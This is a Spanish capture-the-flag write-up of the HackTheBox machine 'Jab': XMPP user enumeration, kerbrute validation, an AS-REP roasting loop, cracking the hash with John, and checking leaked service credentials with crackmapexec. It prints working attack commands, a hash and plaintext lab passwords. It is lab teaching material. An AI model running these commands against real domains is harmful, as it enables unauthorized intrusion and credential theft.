---
title: "HTB: Jab Writeup 🪟"
date: 2024-11-15
tags:
  - ActiveDirectory
  - ASREProast-Attack
  - Ciberseguridad
  - "#OpenFire"
  - "#Pivoting"
  - "#Chisel"
description: Jab es una máquina de dificultad media en Windows que incluye un servidor Openfire XMPP alojado en un Controlador de Dominio (DC). El registro público en el servidor XMPP permite a los usuarios crear una cuenta.
---
---
# Jab

Jab es una máquina de dificultad media en Windows que incluye un servidor Openfire XMPP alojado en un Controlador de Dominio (DC). El registro público en el servidor XMPP permite a los usuarios crear una cuenta. Posteriormente, al obtener una lista de todos los usuarios en el dominio, se identifica una cuenta vulnerable a Kerberoasting. Esto permite al atacante descifrar el hash obtenido para acceder a la contraseña del usuario.

Visitando las salas de chat XMPP de esta cuenta, se recupera la contraseña de otra cuenta. Este nuevo usuario tiene privilegios de DCOM sobre el DC, lo que otorga acceso local a la máquina. Finalmente, al cargar un plugin malicioso a través del panel de administración de Openfire alojado localmente, el atacante logra acceso con privilegios de SYSTEM.

---
<figure>
<img src="/assets/img/Jab/Jab.png" alt="Jab">
<figcaption>Fig 1. JAB HTB</figcaption>
</figure>
## Nmap - Enumeración 

Realizamos nuestro escaneo de puertos usando **Nmap** con parámetros típicos para máquinas de este tipo. Los comandos empleados son los siguientes:

```zsh
sudo nmap -p- --open -Pn -n -sS --min-rate 5000 10.10.11.4 -oG puertos
```

Estos parámetros indican lo siguiente:

- `-p-`: Escanea todos los puertos.
- `--open`: Solo muestra puertos abiertos.
- `-Pn`: Omite la detección de hosts.
- `-n`: Evita la resolución DNS para hacer el escaneo más rápido.
- `-sS`: Realiza un escaneo SYN para descubrir servicios sin establecer una conexión completa.
- `--min-rate 5000`: Asegura que el escaneo se ejecute a una velocidad mínima de 5000 paquetes por segundo.

```zsh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 03:15 -05
Nmap scan report for 10.10.11.4
Host is up (0.11s latency).
Not shown: 65456 closed tcp ports (reset), 44 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5222/tcp  open  xmpp-client
5223/tcp  open  hpvirtgrp
5262/tcp  open  unknown
5263/tcp  open  unknown
5269/tcp  open  xmpp-server
5270/tcp  open  xmp
5275/tcp  open  unknown
5276/tcp  open  unknown
5985/tcp  open  wsman
7070/tcp  open  realserver
7443/tcp  open  oracleas-https
7777/tcp  open  cbt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49694/tcp open  unknown
49707/tcp open  unknown
49737/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds
```

Luego, como exportamos el escaneo en formato grepeable, procesamos el resultado para aislar los puertos abiertos usando esta combinación de comandos:

```zsh
grep 'Ports:' puertos | awk -F 'Ports: ' '{print $2}' | grep -o '[0-9]*' | paste -sd ','
```

Este comando extrae y lista los puertos abiertos en una línea separada por comas, lo cual es útil para posteriores análisis o configuraciones:

```plaintext
53,88,135,139,389,445,464,593,636,3268,3269,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9389,47001,49664,49665,49666,49667,49673,49690,49691,49694,49707,49737
```

Ahora utilizaremos Nmap para realizar un escaneo de análisis de vulnerabilidades en cada uno de los puertos activos de nuestra máquina objetivo. Guardaremos los resultados en un formato estándar (Normal) usando la opción `-oN` para tener un archivo de fácil lectura.

```zsh
sudo nmap -p53,88,135,139,389,445,464,5,593,636,3268,3269,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9389,47001,49664,49665,49666,49667,49673,49690,49691,49694,49707,49737 -sCV -f -Pn -n 10.10.11.4 -oN objetivos.txt
```

**Explicación de las opciones utilizadas**:

- **`-p`**: Especifica los puertos a escanear, en este caso hemos seleccionado aquellos que tienen servicios clave y potenciales vulnerabilidades en entornos de red.
- **`-sCV`**: Realiza detección de versiones (`-sV`) y scripts (`-sC`) para obtener información detallada de servicios, posibles vulnerabilidades y certificados de SSL en los puertos abiertos.
- **`-f`**: Fragmenta los paquetes IP, útil en ciertos entornos donde los firewalls podrían bloquear paquetes de tamaño estándar.
- **`-Pn`**: Omite el ping para dispositivos que puedan bloquearlo o no respondan a él, asegurando que el escaneo no sea interrumpido.
- **`-n`**: Evita resolver nombres de dominio, acelerando el escaneo en redes donde esto no es necesario.
- **`-oN`**: Guarda la salida en formato Normal, fácil de leer y de analizar manualmente.

```zsh
Nmap scan report for 10.10.11.4
Host is up (0.20s latency).

PORT      STATE  SERVICE             VERSION
5/tcp     closed rje
53/tcp    open   domain              Simple DNS Plus
88/tcp    open   kerberos-sec        Microsoft Windows Kerberos (server time: 2024-11-15 08:22:21Z)
135/tcp   open   msrpc               Microsoft Windows RPC
139/tcp   open   netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open   ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-11-15T08:23:39+00:00; 0s from scanner time.
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open   ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-15T08:23:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3268/tcp  open   ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-15T08:23:40+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
3269/tcp  open   ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-11-15T08:23:39+00:00; 0s from scanner time.
5222/tcp  open   jabber
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: y1hieh5oa
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     auth_mechanisms: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    features: 
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5223/tcp  open   ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|_    features: 
5262/tcp  open   jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: 25jq5a55k6
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     auth_mechanisms: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    features: 
5263/tcp  open   ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|_    features: 
5269/tcp  open   xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|_    features: 
5270/tcp  open   ssl/xmpp            Wildfire XMPP Client
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
5275/tcp  open   jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: 44qp4rao7m
|     capabilities: 
|     xmpp: 
|       version: 1.0
|     compression_methods: 
|     auth_mechanisms: 
|     unknown: 
|     errors: 
|       invalid-namespace
|       (timeout)
|_    features: 
5276/tcp  open   ssl/jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|     auth_mechanisms: 
|     compression_methods: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|_    features: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5985/tcp  open   http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7070/tcp  open   realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 15 Nov 2024 08:22:21 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 15 Nov 2024 08:22:26 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp  open   ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 15 Nov 2024 08:22:34 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 15 Nov 2024 08:22:40 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
|_ssl-date: TLS randomness does not represent time
7777/tcp  open   socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9389/tcp  open   mc-nmf              .NET Message Framing
47001/tcp open   http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc               Microsoft Windows RPC
49665/tcp open   msrpc               Microsoft Windows RPC
49666/tcp open   msrpc               Microsoft Windows RPC
49667/tcp open   msrpc               Microsoft Windows RPC
49673/tcp open   msrpc               Microsoft Windows RPC
49690/tcp open   ncacn_http          Microsoft Windows RPC over HTTP 1.0
49691/tcp open   msrpc               Microsoft Windows RPC
49694/tcp open   msrpc               Microsoft Windows RPC
49707/tcp open   msrpc               Microsoft Windows RPC
49737/tcp open   msrpc               Microsoft Windows RPC
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-15T08:23:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 15 03:23:45 2024 -- 1 IP address (1 host up) scanned in 91.99 seconds

```

Dado que hay muchos puertos activos, tenemos una gran cantidad de información sobre cada uno de ellos. Sin embargo, lo más relevante de este escaneo es que hemos identificado que el dominio es `jab.htb` y que el controlador de dominio es `DC01.jab.htb`.  

Agregamos dicha información a nuestro archivo de configuración`/etc/hosts`

```zsh
cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	---

10.10.11.4	jab.htb	DC01.jab.htb
```

Algo que llamó mi atención fue la presencia de varios puertos asociados con servicios de Jabber y XMPP, protocolos con los que nunca había trabajado antes. Esto despertó mi curiosidad, así que decidí enfocarme en el servicio que utiliza **Extensible Messaging and Presence Protocol** (**XMPP**).  

### ¿Qué es XMPP?  
**XMPP**, conocido en español como **Protocolo extensible de mensajería y comunicación de presencia** (anteriormente llamado **Jabber**), es un protocolo **abierto y extensible** basado en **XML**. Fue diseñado originalmente para aplicaciones de **mensajería instantánea** y comunicación en tiempo real.  

Entre sus características destacan:  
- **Abierto y documentado**: A diferencia de protocolos propietarios como ICQ o Windows Live Messenger, XMPP está completamente documentado y puede ser utilizado en cualquier proyecto.  
- **Adaptabilidad**: Hereda la flexibilidad y sencillez de XML, lo que lo hace altamente personalizable.  
- **Plataforma universal**: Permite el intercambio de datos XML, haciendo que no solo sea útil para mensajería, sino también para otros tipos de aplicaciones.  
- **Soporte amplio**: Ha sido adoptado por empresas importantes como **Facebook**, **WhatsApp**, y **Nimbuzz** para sus servicios de chat.  

La idea de explorar un protocolo con tanta historia y uso extendido en aplicaciones modernas me resultó interesante, por lo que comencé a investigar cómo interactuar con este servicio en la máquina objetivo.  

## Host Based Enumeration 

Sabemos de entrada que no podemos acceder a los servicios XMPP directamente desde el navegador. Esto requiere que actuemos como **clientes del servicio**, ya que nuestro objetivo actúa como servidor. Después de investigar un buen rato sobre cómo interactuar con este tipo de servicios, encontré este recurso: [Graphical XMPP](https://www.linuxlinks.com/best-free-open-source-graphical-xmpp-clients/). Entre las opciones disponibles, decidí utilizar **Pidgin**, ya que fue el cliente que mejor funcionó para esta tarea.  

### Instalación de Pidgin
Instalarlo es muy sencillo:  
```bash
sudo apt-get install pidgin
```

### Configuración inicial
Al iniciar Pidgin, aparecerá un mensaje como el siguiente:  
<figure>
<img src="/assets/img/Jab/Imagen1.png" >
</figure>  
Debemos seleccionar el protocolo **XMPP**, que es el adecuado para nuestro caso. A continuación, se nos solicitarán los siguientes datos:  
- **Usuario**  
- **Dominio**  
- **Resource**  
- **Contraseña**  

En este punto, **no contamos con credenciales válidas**, pero vemos una opción para crear una cuenta nueva si fuese necesario. En la pestaña `Advanced`, especificamos la **IP del objetivo** como el servidor:  
<figure>
<img src="/assets/img/Jab/Imagen2.png" >
</figure>    
### Registro como cliente XMPP
Procedemos a registrarnos como clientes del protocolo XMPP. Una vez hecho esto, en la ventana **Buddy List**, seleccionamos la opción **Room List**. Dentro de esta ventana, hacemos clic en el botón **Get List** para obtener una lista de las salas disponibles en el servidor:  
<figure>
<img src="/assets/img/Jab/Imagen3.png" >
</figure>    
<figure>
<img src="/assets/img/Jab/Imagen4.png" >
</figure>    
Cuando hacemos click en el botón `Get List` nos saldrá el siguiente mensaje 
<figure>
<img src="/assets/img/Jab/Imagen5.png" >
</figure>  

Hacemos clic en el botón `Find Rooms`, donde encontramos dos "salas" o "sesiones": `test` y `test2`. 

<figure>
<img src="/assets/img/Jab/Imagen6.png" >
</figure>  

En la sala `test2`, notamos que el usuario `bdavis` ha enviado una imagen. Sin embargo, esta no es una imagen real; contiene un mensaje encriptado en base64. Al decodificarlo, obtenemos el siguiente resultado:

```bash
echo "VGhlIGltYWdlIGRhdGEgZ29lcyBoZXJlCg==" | base64 -d
The image data goes here
```

<figure>
<img src="/assets/img/Jab/Imagen7.png" >
</figure>  

A continuación, utilizamos la herramienta **kerbrute** para verificar si `bdavis` es un usuario válido. Como primer paso, creamos un archivo llamado `users` para almacenar todos los usuarios encontrados en esta máquina. Luego ejecutamos el siguiente comando:

```bash
kerbrute userenum --dc 10.10.11.4 -d jab.htb users
```

El resultado confirma que el usuario `bdavis` es válido:

```plaintext
__             __               __        
/ /_____  _____/ /_  _______  __/ /____   
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
Version: v1.0.3 (9dad6e1) - 11/15/24 - Ronnie Flathers @ropnop
2024/11/15 04:35:54 >  Using KDC(s):
2024/11/15 04:35:54 >  	10.10.11.4:88
2024/11/15 04:35:54 >  [+] VALID USERNAME:	 bdavis@jab.htb
2024/11/15 04:35:54 >  Done! Tested 1 usernames (1 valid) in 0.098 seconds
```

Otra forma de enumerar usuarios válidos en este entorno es mediante la opción **Search for Users** en la ventana `Buddy List`. Al usar un comodín (`*`), podemos listar todos los usuarios disponibles.
<figure>
<img src="/assets/img/Jab/Imagen8.png" >
</figure>  
<figure>
<img src="/assets/img/Jab/Imagen9.png" >
</figure>  

Además, podemos habilitar el plugin `XMPP Console`, que se encuentra en `Tools` → `Plugin`. Al activar esta opción y desplazarnos hacia abajo, encontraremos el plugin. Este permite obtener información de todos los usuarios directamente desde la consola, sin necesidad de copiarlos uno por uno. Recordemos que XMPP utiliza formato XML para transmitir mensajes, por lo que los usuarios aparecerán en dicho formato en la consola.
## Enumeración  de Usuarios

Copiamos dicha información en algún archivo de la siguiente manera 

`XMPP Console`
<figure>
<img src="/assets/img/Jab/Imagen10.png" >
</figure>   `XMPP_ENUM`
<figure>
<img src="/assets/img/Jab/Imagen11.png" >
</figure>  
Esto lo hacemos con la finalidad de controlar la salida del archivo y quedarnos solo con el nombre de usuario, para aquello utilizamos el siguiente formato 
```zsh
grep jab.htb xmpp_enu.txt | awk -F \> '{print $2}' | awk -F @ '{print $1}' | sort -u > posibles_usuarios.txt
```

Utilizamos kerbrute para validar que los usuarios sean validos 

```zsh
kerbrute userenum --dc 10.10.11.4 -d jab.htb posibles_usuarios.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/15/24 - Ronnie Flathers @ropnop

2024/11/15 05:03:52 >  Using KDC(s):
2024/11/15 05:03:52 >  	10.10.11.4:88

2024/11/15 05:03:52 >  [+] VALID USERNAME:	 aaltman@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 aallen@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 abernard@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 aaaron@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 abarr@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 abeckner@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 aanderson@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 aarrowood@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 abeaubien@jab.htb
2024/11/15 05:03:52 >  [+] VALID USERNAME:	 abanks@jab.htb
2024/11/15 05:03:53 >  [+] VALID USERNAME:	 abing@jab.htb
2024/11/15 05:03:53 >  [+] VALID USERNAME:	 abriggs@jab.htb
2024/11/15 05:03:53 >  [+] VALID USERNAME:	 abowman@jab.htb
```

En un primer análisis, parecería que todos los usuarios enumerados son válidos. Con esta lista confirmada, podemos proceder a realizar un ataque **ASREPRoast** para intentar obtener hashes Kerberos de usuarios configurados sin la opción *Do not require Kerberos preauthentication*. Aquí está el comando que utilicé:
## ASREPRoast Attack

Si quieres saber como funciona este ataque te invito a visitar la resolución de la maquina [Sauna](https://7heansw3r.github.io/HTB-Sauna-Writeup/) donde explico a detalle como funciona el ataque.

```bash
while read user; do 
    impacket-GetNPUsers jab.htb/"$user@jab.htb" -request -no-pass -dc-ip 10.10.11.4 >> hash.txt 2>/dev/null
done < posibles_usuarios.txt
```

Sin embargo, este método puede ser lento, especialmente si trabajamos con una lista extensa de usuarios. Estoy buscando una manera de optimizar este proceso para hacerlo más eficiente, mientras tanto podemos utilizar el comando `grep krb hash.txt` en una ventana en paralelo para tener los posibles resultados después de un largo rato encontramos una cuenta que Requiere preautenticación 

```zsh
grep krb hash.txt
$krb5asrep$23$jmontgomery@jab.htb@JAB.HTB:36ae0005b3a314b420ff539ee1a4349e$dd298b67149e896e4b991ebde0921c8e57c63b0784be5dcffc2e966da614a91e6a549f34f3197fa63af7c2cb232dafdbf7072e8cdedc269d58744c0bdf2be011deb2c61d4a9eef28662b913a9d27cbb190b074fd87dd9196f44efe0571bda2a5a0e07c14b766059bba02554e46572bcef83296199ca34f4c5e6e14826306cad2ec5cb53d894f36aa22bf981d813e5f1b1a2d6c4f70db9c3ee62c4830f9b2c6c1ed66c5f736ec0d473f08774845f9196ab05bf9555ed8126863ca6a9a6f10544fbf4a634f20c3f6c3c44f998b9ba769fb1b165a44d01b43dc19baa32a8f169a85822e
```

Como nos gusta romper todo utilizamos john o hashcat para tener la contraseña en texto plano si es posible y pues si es posible. 

```zsh
john hash_jmont --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Midnight_121     ($krb5asrep$23$jmontgomery@jab.htb@JAB.HTB)     
1g 0:00:00:16 DONE (2024-11-15 05:51) 0.05913g/s 640196p/s 640196c/s 640196C/s Mike2745..Mia1216
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Con credenciales validas podemos hacer muchas cosas como iniciar sesión en el servicio **XMPP** del objetivo, permitiéndonos interactuar directamente con su plataforma de mensajería.

<figure>
<img src="/assets/img/Jab/Imagen12.png" >
</figure>  

Al igual que con el usuario que creamos vemos las "Room List" al que el usuario puede ingresar, vemos que hay un chat bastante peculiar llamado pentest2003

<figure>
<img src="/assets/img/Jab/Imagen13.png" >
</figure>  
En el Chat se menciona lo siguiente 
- Se menciona una discusión sobre la remediación de hallazgos de pruebas de penetración anteriores y la validación de configuraciones de seguridad, como la eliminación del **SPN** de la cuenta `svc_openfire`.
- **Comando relacionado con SPN**: Uno de los mensajes incluye el uso de un comando de Impacket, `GetUserSPNs.py`, para obtener SPNs (Service Principal Names) de los usuarios. En este caso, se está buscando el SPN asociado con `svc_openfire`.
- **Ataque Kerberos (ASREPRoast)**: Después de obtener un TGS (Ticket Granting Service) válido, se menciona el uso de **Hashcat** para hacer crack del hash Kerberos con el archivo de hashes obtenido.
## User SVC_Openfire

Con las credenciales del usuario `svc_openfire` obtenemos el siguiente resultado:  
**Usuario**: `svc_openfire`  
**Contraseña**: `!@#$%^&*(1qazxsw`.

Ahora, necesitamos verificar si estas credenciales siguen en uso. Para hacerlo, utilizamos herramientas como `crackmapexec` o `nxc`. Primero, comprobamos la validez de las credenciales en el servicio SMB:

```zsh
crackmapexec smb 10.10.11.4 -u svc_openfire -p '!@#$%^&*(1qazxsw' 2>/dev/null
```

```
SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.4      445    DC01             [+] jab.htb\svc_openfire:!@#$%^&*(1qazxsw
```

Las credenciales son válidas para acceder al servicio SMB, lo que confirma que el usuario está activo. Luego, realizamos la prueba con `winrm` para comprobar si tenemos acceso por este servicio:

```zsh
crackmapexec winrm 10.10.11.4 -u svc_openfire -p '!@#$%^&*(1qazxsw' 2>/dev/null
```

```
SMB         10.10.11.4      5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:jab.htb) 
HTTP        10.10.11.4      5985   DC01             [*] http://10.10.11.4:5985/wsman
WINRM       10.10.11.4      5985   DC01             [-] jab.htb\svc_openfire:!@#$%^&*(1qazxsw
```

Aunque las credenciales son válidas, no tenemos ejecución remota de comandos por `winrm`. A continuación, realizamos un escaneo de los recursos compartidos en la red utilizando `crackmapexec`:

```zsh
crackmapexec smb 10.10.11.4 -u svc_openfire -p '!@#$%^&*(1qazxsw' --shares 2>/dev/null
```

```
SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.4      445    DC01             [+] jab.htb\svc_openfire:!@#$%^&*(1qazxsw
SMB         10.10.11.4      445    DC01             [+] Enumerated shares
SMB         10.10.11.4      445    DC01             Share           Permissions     Remark
SMB         10.10.11.4      445    DC01             -----           -----------     ------
SMB         10.10.11.4      445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.4      445    DC01             C$                              Default share
SMB         10.10.11.4      445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.4      445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.4      445    DC01             SYSVOL          READ            Logon server share
```

